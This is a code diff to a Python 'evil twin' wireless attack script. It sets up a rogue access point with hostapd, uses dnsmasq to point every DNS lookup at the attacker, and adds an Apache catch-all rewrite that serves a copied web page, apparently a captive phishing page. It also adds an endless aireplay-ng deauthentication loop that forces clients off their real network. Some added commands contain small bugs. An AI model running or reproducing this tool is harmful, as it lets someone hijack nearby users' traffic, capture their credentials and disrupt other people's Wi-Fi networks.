@@ -18,13 +18,13 @@ def bash(cmd):
 
 def enable_monitor_mode(interface):
     bash(f"ifconfig {interface} down")
-    bash(f"iwconfig {interface} mode monitor")
+    bash(f"iw {interface} set monitor none")
     bash(f"ifconfig {interface} up")
 
 
 def disable_monitor_mode(interface):
     bash(f"ifconfig {interface} down")
-    bash(f"iwconfig {interface} mode managed")
+    bash(f"iw {interface} mode managed")
     bash(f"ifconfig {interface} up")
 
 
@@ -32,7 +32,7 @@ def change_channel(interface):
     global done_scanning
     ch = 1
     while True and not done_scanning:
-        bash(f"iwconfig {interface} channel {ch}")
+        bash(f"iw {interface} channel {ch}")
         # switch channel from 1 to 14 each 0.5s
         ch = ch % 14 + 1
         time.sleep(0.5)
@@ -87,19 +87,20 @@ def setup_dnsmasq_conf(interface):
     #  set up dnsmasq.conf for DHCP server
     print("[*] Setting up dnsmasq.conf for DHCP server")
     with open("/etc/dnsmasq.conf", "w") as f:
+        f.write("no-resolv\n")
         f.write("interface=%s\n" % interface)
-        f.write("dhcp-range=192.168.0.2,192.168.0.150,255.255.255.0,12h\n")
-        f.write("dhcp-option=3,192.168.1.1\n")
-        f.write("dhcp-option=6,192.168.1.1\n")
+        f.write("dhcp-range=192.168.1.2,192.168.1.150,12h\n")
+        f.write("dhcp-option=3,192.168.1.1\n")  # gw
+        f.write("dhcp-option=6,192.168.1.1\n")  # dns
+        f.write(f"address=/#/192.168.1.1\n")
         f.write("server=8.8.8.8\n")
-        f.write("listen-address=127.0.0.1\n")
 
 
 def setup_iptables(interface):
     #  set up iptables for access point
-    bash("iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE")
-    bash(f"iptables -A FORWARD -i {interface} -o eth0 -j ACCEPT")
-    bash("echo 1 > /proc/sys/net/ipv4/ip_forward")
+    bash("iptables -t nat -A POSTROUTING -o wlp2s0 -j MASQUERADE")
+    bash(f"iptables -A FORWARD -i {interface} -o wlp2s0 -j ACCEPT")
+    bash("sysctl net.ipv4.ip_forward=1")
 
 
 def setup_ap(interface):
@@ -109,15 +110,16 @@ def setup_ap(interface):
     setup_hostapd_conf(interface)
     bash(f"hostapd -B /etc/hostapd/hostapd.conf &")
     #  set up dnsmasq.conf
-    bash(f"ifconfig {interface} up 192.168.1.1 netmask 255.255.255.0")
+    bash(f"ifconfig {interface} up 192.168.1.1/24 netmask 255.255.255.0")
     bash("route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1")
     print("[*] Setting up dhcp server")
     setup_dnsmasq_conf(interface)
-    bash(f"dnsmasq -C /etc/dnsmasq.conf &")
+    bash(f"dnsmasq -C /etc/dnsmasq.conf")
     #  set up iptables
     print("[*] Setting up iptables")
     setup_iptables(interface)
     print("[*] Access point is up and ready")
+
 
 def killall():
     #  kill all attack processes
@@ -130,7 +132,7 @@ def killall():
     bash("iptables --flush --table nat")
     bash("iptables --delete-chain")
     bash("iptables --table nat --delete-chain")
-    bash('systemctl stop apache2')
+    bash("systemctl stop apache2")
 
 
 def start_evil_twin(interface):
@@ -175,8 +177,71 @@ def start_evil_twin(interface):
 
     #  set up access point for client to connect to
     setup_ap(interface)
-    time.sleep(100)
+
+    # start deauth thread
+    print("[*] Starting deauth thread")
+    #setup_de_auth(interface)
+
+    #  start apache server
+    print("[*] Starting apache server")
+    setup_apache_server()
+
+    input("[*] Press enter to continue")
+
+    # bash("service apache2 start")
+
     killall()
+
+
+def setup_apache_server():
+    #  set up apache2 configuration
+    print("[*] Setting up apache2 configuration")
+    with open("/etc/apache2/sites-enabled/000-default.conf", "w") as f:
+        f.write("<VirtualHost *:80>\n")
+        f.write("\tServerAdmin webmaster@localhost\n")
+        f.write("\tDocumentRoot /var/www/html\n")
+        f.write("\tErrorLog ${APACHE_LOG_DIR}/error.log\n")
+        f.write("\tCustomLog ${APACHE_LOG_DIR}/access.log combined\n")
+        f.write("</VirtualHost>\n")
+        f.write("<Directory /var/www/html>\n")
+        f.write("\tRewriteEngine on\n")
+        f.write("\tRewriteBase /\n")
+        f.write("\tRewriteCond %{HTTP_HOST} ^www\\.(.*)$ [NC]\n")
+        f.write("\tRewriteRule ^(.*)$ http://%1/$1 [R=301,L]\n")
+        f.write("\n\tRewriteCond %{REQUEST_FILENAME} !-f\n")
+        f.write("\tRewriteCond %{REQUEST_FILENAME} !-d\n")
+        f.write("\tRewriteRule ^(.*)$ / [L,QSA]\n")
+        f.write("</Directory>\n")
+    #  set up apache server
+    bash("cp `pwd`/website/index.html /var/www/html/")
+    bash("systemctl start apache2")
+
+
+def setup_de_auth(interface):
+    global deauth_thread
+    # if we dont want using this tool:
+    # https://github.com/catalyst256/MyJunk/blob/master/scapy-deauth.py
+    deauth_thread = threading.Thread(target=de_auth_clients, args=(interface,))
+    deauth_thread.start()
+    deauth_thread.join()
+
+
+def de_auth_clients(interface):
+    """
+    aireplay is a tool that deauthenticates clients from an access point
+    -0 is deauthentication
+    -0 is infinite deauthentication
+    -a is the access point MAC address
+    -c is the number of packets to send
+    """
+    global ap_to_attack, client_to_attack
+    de_auth_command = f"aireplay-ng -0 0 -a {ap_to_attack[0]}"
+    if client_to_attack is not None:
+        de_auth_command += f"-c  {client_to_attack}"
+    de_auth_command += interface
+    while True:
+        bash(f"aireplay-ng -0 0 -a {ap_to_attack[0]} {interface} ")
+        time.sleep(1)
 
 
 def main():
@@ -199,4 +264,5 @@ def main():
 
 
 if __name__ == "__main__":
+    killall()
     main()
